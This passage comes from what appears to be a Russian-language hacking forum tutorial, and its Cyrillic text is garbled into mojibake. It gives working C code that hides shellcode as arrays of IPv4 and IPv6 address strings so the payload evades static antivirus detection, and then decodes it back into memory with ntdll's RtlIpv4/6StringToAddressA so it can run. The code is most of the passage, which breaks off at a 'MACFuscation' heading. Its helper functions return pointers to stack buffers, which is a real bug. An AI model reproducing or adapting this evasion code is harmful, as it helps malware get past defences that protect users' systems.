<b>IPv6Fuscation</b> - –≠—Ç–æ—Ç –º–µ—Ç–æ–¥ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∞–Ω–∞–ª–æ–≥–∏—á–Ω—É—é –ª–æ–≥–∏–∫—É, –∫–∞–∫ –≤ –ø—Ä–∏–º–µ—Ä–µ IPv4Fuscation, –Ω–æ –≤–º–µ—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è 4 –±–∞–π—Ç–æ–≤ –Ω–∞ IP-–∞–¥—Ä–µ—Å, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è 16 –±–∞–π—Ç–æ–≤ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –æ–¥–Ω–æ–≥–æ –∞–¥—Ä–µ—Å–∞ IPv6. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –±–∞–π—Ç–æ–≤ –≤ –¥–µ—Å—è—Ç–∏—á–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è –¥–ª—è –∞–¥—Ä–µ—Å–æ–≤ IPv6. –í –∫–∞—á–µ—Å—Ç–≤–µ –ø—Ä–∏–º–µ—Ä–∞ –¥–ª—è —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ shellcode —ç—Ç–æ –±—É–¥–µ—Ç FC48:83E4:F0E8:C000:0000:4151:4150:5251.<br />
<br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è IPv4Fuscation</b><br />
<br />
–¢–µ–ø–µ—Ä—å, –∫–æ–≥–¥–∞ –ª–æ–≥–∏–∫–∞ –æ–±—ä—è—Å–Ω–µ–Ω–∞, —ç—Ç–æ—Ç —Ä–∞–∑–¥–µ–ª –±—É–¥–µ—Ç –ø–æ—Å–≤—è—â–µ–Ω —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ IPv4Fuscation. –ù–µ—Å–∫–æ–ª—å–∫–æ –º–æ–º–µ–Ω—Ç–æ–≤ –æ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–º –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–µ –∫–æ–¥–∞:<br />
<br />
–ö–∞–∫ —É–∂–µ —É–ø–æ–º–∏–Ω–∞–ª–æ—Å—å —Ä–∞–Ω–µ–µ, –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∞–¥—Ä–µ—Å–∞ IPv4 —Ç—Ä–µ–±—É–µ—Ç—Å—è 4 –±–∞–π—Ç–∞, –ø–æ—ç—Ç–æ–º—É shellcode <b>–¥–æ–ª–∂–µ–Ω —Å–æ—Å—Ç–æ—è—Ç—å –∏–∑ –∫—Ä–∞—Ç–Ω–æ–≥–æ 4 —á–∏—Å–ª–∞ –±–∞–π—Ç–æ–≤.</b> –ú–æ–∂–Ω–æ —Å–æ–∑–¥–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é, –∫–æ—Ç–æ—Ä–∞—è –¥–æ–ø–æ–ª–Ω—è–µ—Ç shellcode, –µ—Å–ª–∏ –æ–Ω –Ω–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç —ç—Ç–æ–º—É —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—é.<br />
<br />
<b>GenerateIpv4</b> - —ç—Ç–æ –≤—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–∏–Ω–∏–º–∞–µ—Ç 4 –±–∞–π—Ç–∞ shellcode –∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç sprintf –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∞–¥—Ä–µ—Å–∞ IPv4.<br />
<br />
–ù–∞–∫–æ–Ω–µ—Ü, –∫–æ–¥ –æ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç —Ç–æ–ª—å–∫–æ –æ–±—Ñ—É—Å–∫–∞—Ü–∏—é, –≤ —Ç–æ –≤—Ä–µ–º—è –∫–∞–∫ –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏—è –æ–±—ä—è—Å–Ω—è–µ—Ç—Å—è —á—É—Ç—å –ø–æ–∑–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Function takes in 4 raw bytes and returns them in an IPv4 string format
char* GenerateIpv4(int a, int b, int c, int d) {
    unsigned char Output [32];

    // Creating the IPv4 address and saving it to the &#039;Output&#039; variable
    sprintf(Output, &quot;%d.%d.%d.%d&quot;, a, b, c, d);

    // Optional: Print the &#039;Output&#039; variable to the console
    // printf(&quot;[i] Output: %s\n&quot;, Output);

    return (char*)Output;
}


// Generate the IPv4 output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer &amp; the size of the shellcode buffer
BOOL GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {

    // If the shellcode buffer is null or the size is not a multiple of 4, exit
    if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 4 != 0){
        return FALSE;
    }
    printf(&quot;char* Ipv4Array[%d] = { \n\t&quot;, (int)(ShellcodeSize / 4));

    // We will read one shellcode byte at a time, when the total is 4, begin generating the IPv4 address
    // The variable &#039;c&#039; is used to store the number of bytes read. By default, starts at 4.
    int c = 4, counter = 0;
    char* IP = NULL;

    for (int i = 0; i &lt; ShellcodeSize; i++) {

        // Track the number of bytes read and when they reach 4 we enter this if statement to begin generating the IPv4 address
        if (c == 4) {
            counter++;

            // Generating the IPv4 address from 4 bytes which begin at i until [i + 3]
            IP = GenerateIpv4(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3]);

            if (i == ShellcodeSize - 4) {
                // Printing the last IPv4 address
                printf(&quot;\&quot;%s\&quot;&quot;, IP);
                break;
            }
            else {
                // Printing the IPv4 address
                printf(&quot;\&quot;%s\&quot;, &quot;, IP);
            }

            c = 1;

            // Optional: To beautify the output on the console
            if (counter % 8 == 0) {
                printf(&quot;\n\t&quot;);
            }
        }
        else {
            c++;
        }
    }
    printf(&quot;\n};\n\n&quot;);
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è IPv6Fuscation</b><br />
<br />
–ü—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ IPv6Fuscation shellcode –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –∫—Ä–∞—Ç–µ–Ω 16. –û–ø—è—Ç—å –∂–µ, –º–æ–∂–Ω–æ —Å–æ–∑–¥–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é, –∫–æ—Ç–æ—Ä–∞—è –¥–æ–ø–æ–ª–Ω—è–µ—Ç shellcode, –µ—Å–ª–∏ –æ–Ω –Ω–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç —ç—Ç–æ–º—É —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—é.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Function takes in 16 raw bytes and returns them in an IPv6 address string format
char* GenerateIpv6(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {

    // Each IPv6 segment is 32 bytes
    char Output0[32], Output1[32], Output2[32], Output3[32];

    // There are 4 segments in an IPv6 (32 * 4 = 128)
    char result[128];

    // Generating output0 using the first 4 bytes
    sprintf(Output0, &quot;%0.2X%0.2X:%0.2X%0.2X&quot;, a, b, c, d);

    // Generating output1 using the second 4 bytes
    sprintf(Output1, &quot;%0.2X%0.2X:%0.2X%0.2X&quot;, e, f, g, h);

    // Generating output2 using the third 4 bytes
    sprintf(Output2, &quot;%0.2X%0.2X:%0.2X%0.2X&quot;, i, j, k, l);

    // Generating output3 using the last 4 bytes
    sprintf(Output3, &quot;%0.2X%0.2X:%0.2X%0.2X&quot;, m, n, o, p);

    // Combining Output0,1,2,3 to generate the IPv6 address
    sprintf(result, &quot;%s:%s:%s:%s&quot;, Output0, Output1, Output2, Output3);

    // Optional: Print the &#039;result&#039; variable to the console
    // printf(&quot;[i] result: %s\n&quot;, (char*)result);

    return (char*)result;
}


// Generate the IPv6 output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer &amp; the size of the shellcode buffer
BOOL GenerateIpv6Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
    // If the shellcode buffer is null or the size is not a multiple of 16, exit
    if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 16 != 0){
        return FALSE;
    }
    printf(&quot;char* Ipv6Array [%d] = { \n\t&quot;, (int)(ShellcodeSize / 16));

    // We will read one shellcode byte at a time, when the total is 16, begin generating the IPv6 address
    // The variable &#039;c&#039; is used to store the number of bytes read. By default, starts at 16.
    int c = 16, counter = 0;
    char* IP = NULL;

    for (int i = 0; i &lt; ShellcodeSize; i++) {
        // Track the number of bytes read and when they reach 16 we enter this if statement to begin generating the IPv6 address
        if (c == 16) {
            counter++;

            // Generating the IPv6 address from 16 bytes which begin at i until [i + 15]
            IP = GenerateIpv6(
                pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3],
                pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7],
                pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11],
                pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]
            );
            if (i == ShellcodeSize - 16) {

                // Printing the last IPv6 address
                printf(&quot;\&quot;%s\&quot;&quot;, IP);
                break;
            }
            else {
                // Printing the IPv6 address
                printf(&quot;\&quot;%s\&quot;, &quot;, IP);
            }
            c = 1;

            // Optional: To beautify the output on the console
            if (counter % 3 == 0) {
                printf(&quot;\n\t&quot;);
            }
        }
        else {
            c++;
        }
    }
    printf(&quot;\n};\n\n&quot;);
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–î–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏—è IPv4/IPv6Fuscation</b><br />
<br />
–ü–æ—Å–ª–µ —Ç–æ–≥–æ –∫–∞–∫ –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π payload —É—Å–ø–µ—à–Ω–æ –æ–±–æ—à–µ–ª —Å—Ç–∞—Ç–∏—á–µ—Å–∫–æ–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ, –µ–≥–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –¥–µ–æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞—Ç—å –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. –ü—Ä–æ—Ü–µ—Å—Å –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –±—É–¥–µ—Ç –æ–±—Ä–∞—Ç–Ω—ã–º –ø—Ä–æ—Ü–µ—Å—Å—É –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏, –ø–æ–∑–≤–æ–ª—è—è –≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å –±–∞–π—Ç—ã –∏–∑ IP-–∞–¥—Ä–µ—Å–∞ –≤–º–µ—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –±–∞–π—Ç–æ–≤ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ IP-–∞–¥—Ä–µ—Å–∞. –î–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏—è –ø–æ—Ç—Ä–µ–±—É–µ—Ç —Å–ª–µ–¥—É—é—â–µ–≥–æ:<br />
<br />
IPv4 –î–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏—è - –î–ª—è —ç—Ç–æ–≥–æ –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ NTAPI RtlIpv4StringToAddressA. –û–Ω–∞ –ø—Ä–µ–æ–±—Ä–∞–∑—É–µ—Ç —Å—Ç—Ä–æ–∫–æ–≤–æ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ IPv4-–∞–¥—Ä–µ—Å–∞ –≤ –±–∏–Ω–∞—Ä–Ω—ã–π IPv4-–∞–¥—Ä–µ—Å.<br />
IPv6 –î–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏—è - –ê–Ω–∞–ª–æ–≥–∏—á–Ω–æ –ø—Ä–µ–¥—ã–¥—É—â–µ–π —Ñ—É–Ω–∫—Ü–∏–∏, –¥–ª—è –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ IPv6 –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –¥—Ä—É–≥–æ–π NTAPI RtlIpv6StringToAddressA. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–µ–æ–±—Ä–∞–∑—É–µ—Ç IPv6-–∞–¥—Ä–µ—Å –≤ –±–∏–Ω–∞—Ä–Ω—ã–π IPv6-–∞–¥—Ä–µ—Å.<br />
<br />
<b>–î–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏—è Payloads IPv4Fuscation</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è Ipv4Deobfuscation –ø—Ä–∏–Ω–∏–º–∞–µ—Ç Ipv4Array –≤ –∫–∞—á–µ—Å—Ç–≤–µ –ø–µ—Ä–≤–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –º–∞—Å—Å–∏–≤ IPv4-–∞–¥—Ä–µ—Å–æ–≤. –í—Ç–æ—Ä–æ–π –ø–∞—Ä–∞–º–µ—Ç—Ä - —ç—Ç–æ NmbrOfElements, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ IPv4-–∞–¥—Ä–µ—Å–æ–≤ –≤ –º–∞—Å—Å–∏–≤–µ Ipv4Array –¥–ª—è –∏—Ç–µ—Ä–∞—Ü–∏–∏ –ø–æ —Ä–∞–∑–º–µ—Ä—É –º–∞—Å—Å–∏–≤–∞. –ü–æ—Å–ª–µ–¥–Ω–∏–µ 2 –ø–∞—Ä–∞–º–µ—Ç—Ä–∞, ppDAddress –∏ pDSize, –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–µ–æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ payload –∏ –µ–≥–æ —Ä–∞–∑–º–µ—Ä–∞ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ.<br />
<br />
–ü—Ä–æ—Ü–µ—Å—Å –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏ RtlIpv4StringToAddressA —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º GetProcAddress –∏ GetModuleHandle. –ó–∞—Ç–µ–º –≤—ã–¥–µ–ª—è–µ—Ç—Å—è –±—É—Ñ–µ—Ä, –∫–æ—Ç–æ—Ä—ã–π –≤ –∫–æ–Ω–µ—á–Ω–æ–º –∏—Ç–æ–≥–µ –±—É–¥–µ—Ç —Ö—Ä–∞–Ω–∏—Ç—å –¥–µ–æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π payload —Ä–∞–∑–º–µ—Ä–∞ NmbrOfElements * 4. –õ–æ–≥–∏–∫–∞ –∑–∞ —ç—Ç–∏–º —Ä–∞–∑–º–µ—Ä–æ–º –≤ —Ç–æ–º, —á—Ç–æ –∫–∞–∂–¥—ã–π IPv4 –±—É–¥–µ—Ç –≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å 4 –±–∞–π—Ç–∞.<br />
<br />
–ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Ü–∏–∫–ª—É for. –°–Ω–∞—á–∞–ª–∞ –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç—Å—è –Ω–æ–≤–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è, TmpBuffer, –∏ –æ–Ω–∞ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è —Ä–∞–≤–Ω–æ–π pBuffer. –ó–∞—Ç–µ–º TmpBuffer –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –≤ RtlIpv4StringToAddressA –∫–∞–∫ —á–µ—Ç–≤–µ—Ä—Ç—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä, –≥–¥–µ –±—É–¥–µ—Ç —Ö—Ä–∞–Ω–∏—Ç—å—Å—è –±–∏–Ω–∞—Ä–Ω–æ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ IPv4-–∞–¥—Ä–µ—Å–∞. –§—É–Ω–∫—Ü–∏—è RtlIpv4StringToAddressA –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç 4 –±–∞–π—Ç–∞ –≤ –±—É—Ñ–µ—Ä TmpBuffer, –ø–æ—ç—Ç–æ–º—É –ø–æ—Å–ª–µ —ç—Ç–æ–≥–æ TmpBuffer —É–≤–µ–ª–∏—á–∏–≤–∞–µ—Ç—Å—è –Ω–∞ 4, —á—Ç–æ–±—ã –ø–æ–∑–≤–æ–ª–∏—Ç—å —Å–ª–µ–¥—É—é—â–∏–º 4 –±–∞–π—Ç–∞–º –±—ã—Ç—å –∑–∞–ø–∏—Å–∞–Ω–Ω—ã–º –≤ –Ω–µ–≥–æ –±–µ–∑ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö –±–∞–π—Ç–æ–≤.<br />
<br />
–ù–∞–∫–æ–Ω–µ—Ü, ppDAddress –∏ pDSize —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç—Å—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –±–∞–∑–æ–≤–æ–≥–æ –∞–¥—Ä–µ—Å–∞ –¥–µ–æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ payload, –∞ —Ç–∞–∫–∂–µ –µ–≥–æ —Ä–∞–∑–º–µ—Ä–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef NTSTATUS (NTAPI* fnRtlIpv4StringToAddressA)(
    PCSTR        S,
    BOOLEAN        Strict,
    PCSTR*        Terminator,
       PVOID        Addr
);

BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE           pBuffer                 = NULL,
                    TmpBuffer               = NULL;

    SIZE_T          sBuffSize               = NULL;

    PCSTR           Terminator              = NULL;

    NTSTATUS        STATUS                  = NULL;

    // Getting RtlIpv4StringToAddressA address from ntdll.dll
    fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT(&quot;NTDLL&quot;)), &quot;RtlIpv4StringToAddressA&quot;);
    if (pRtlIpv4StringToAddressA == NULL){
        printf(&quot;[!] GetProcAddress Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of IPv4 addresses * 4
    sBuffSize = NmbrOfElements * 4;

    // Allocating memory which will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL){
        printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;

    // Loop through all the IPv4 addresses saved in Ipv4Array
    for (int i = 0; i &lt; NmbrOfElements; i++) {

        // Deobfuscating one IPv4 address at a time
        // Ipv4Array[i] is a single ipv4 address from the array Ipv4Array
        if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &amp;Terminator, TmpBuffer)) != 0x0) {
            // if it failed
            printf(&quot;[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X&quot;, Ipv4Array[i], STATUS);
            return FALSE;
        }

        // 4 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 4 to store the upcoming 4 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 4);

    }

    // Save the base address &amp; size of the deobfuscated payload
    *ppDAddress     = pBuffer;
    *pDSize         = sBuffSize;

    return TRUE;
}</code></pre>
	</div>
</div><br />
–°–ª–µ–¥—É—é—â–∏–π —Ä–∏—Å—É–Ω–æ–∫ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç, —á—Ç–æ —É–∫–∞–∑–∞–Ω–Ω—ã–π –∫–æ–¥ —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω...<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773905227.png"
		data-src="https://osint42.org/attachments/1746773905227-png.81/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773905227-png.81/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773905227.png"
			title="1746773905227.png"
			width="1292" height="881" loading="lazy" />
	</div><br />
<br />
<b>–î–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏—è Payloads IPv6Fuscation</b><br />
<br />
–í—Å–µ —à–∞–≥–∏ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –¥–ª—è IPv6 —Ç–∞–∫–∏–µ –∂–µ, –∫–∞–∫ –∏ –¥–ª—è IPv4, –∑–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ–º –¥–≤—É—Ö –æ—Å–Ω–æ–≤–Ω—ã—Ö —Ä–∞–∑–ª–∏—á–∏–π:<br />
<ol>
<li data-xf-list-type="ol">–ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è RtlIpv6StringToAddressA –≤–º–µ—Å—Ç–æ RtlIpv4StringToAddressA.</li>
<li data-xf-list-type="ol">–ö–∞–∂–¥—ã–π IPv6-–∞–¥—Ä–µ—Å –¥–µ–æ–±—Ñ—É—Å—Ü–∏—Ä—É–µ—Ç—Å—è –≤ 16 –±–∞–π—Ç–æ–≤ –≤–º–µ—Å—Ç–æ 4 –±–∞–π—Ç–æ–≤.</li>
</ol>–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –ø—Ä–∏ –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ IPv6Fuscation –≤–∞–º –Ω—É–∂–Ω–æ –±—É–¥–µ—Ç –∞–¥–∞–ø—Ç–∏—Ä–æ–≤–∞—Ç—å –∞–ª–≥–æ—Ä–∏—Ç–º, —á—Ç–æ–±—ã —É—á–∏—Ç—ã–≤–∞—Ç—å –¥–ª–∏–Ω—É 16 –±–∞–π—Ç–æ–≤ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –∞–¥—Ä–µ—Å–∞ –∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â—É—é —Ñ—É–Ω–∫—Ü–∏—é –¥–ª—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫–æ–≤–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è IPv6 –æ–±—Ä–∞—Ç–Ω–æ –≤ –±–∏–Ω–∞—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
    PCSTR        S,
    PCSTR*        Terminator,
    PVOID        Addr
);

BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE           pBuffer                 = NULL,
                    TmpBuffer               = NULL;

    SIZE_T          sBuffSize               = NULL;

    PCSTR           Terminator              = NULL;

    NTSTATUS        STATUS                  = NULL;

    // Getting RtlIpv6StringToAddressA address from ntdll.dll
    fnRtlIpv6StringToAddressA pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT(&quot;NTDLL&quot;)), &quot;RtlIpv6StringToAddressA&quot;);
    if (pRtlIpv6StringToAddressA == NULL) {
        printf(&quot;[!] GetProcAddress Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of IPv6 addresses * 16
    sBuffSize = NmbrOfElements * 16;


    // Allocating memory which will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL) {
        printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    TmpBuffer = pBuffer;

    // Loop through all the IPv6 addresses saved in Ipv6Array
    for (int i = 0; i &lt; NmbrOfElements; i++) {

        // Deobfuscating one IPv6 address at a time
        // Ipv6Array[i] is a single IPv6 address from the array Ipv6Array
        if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &amp;Terminator, TmpBuffer)) != 0x0) {
            // if it failed
            printf(&quot;[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X&quot;, Ipv6Array[i], STATUS);
            return FALSE;
        }

        // 16 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 16);

    }

    // Save the base address &amp; size of the deobfuscated payload
    *ppDAddress  = pBuffer;
    *pDSize      = sBuffSize;

    return TRUE;

}</code></pre>
	</div>
</div><br />
–°–ª–µ–¥—É—é—â–∏–π —Ä–∏—Å—É–Ω–æ–∫ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç, —á—Ç–æ —É–∫–∞–∑–∞–Ω–Ω—ã–π –∫–æ–¥ —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω...<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773922958.png"
		data-src="https://osint42.org/attachments/1746773922958-png.82/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773922958-png.82/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773922958.png"
			title="1746773922958.png"
			width="1408" height="836" loading="lazy" />
	</div><br />
<br />
<b>2)–†–µ–∞–ª–∏–∑–∞—Ü–∏—è MACFuscation </b><br />
<br />
